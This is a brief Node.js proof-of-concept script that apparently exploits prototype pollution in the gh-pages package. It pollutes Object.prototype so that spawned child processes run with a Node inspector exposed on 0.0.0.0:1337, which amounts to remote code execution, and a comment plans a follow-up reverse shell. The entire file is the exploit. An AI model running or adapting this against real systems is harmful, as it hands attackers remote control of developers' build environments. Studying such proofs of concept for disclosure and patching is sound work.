var ghpages = require('gh-pages');

Object.prototype.shell = "node";
Object.prototype.NODE_OPTIONS = '--inspect-brk=0.0.0.0:1337';

// TODO: try a reverse shell based on `env`

ghpages.publish(__dirname + '/dist', function(err) {});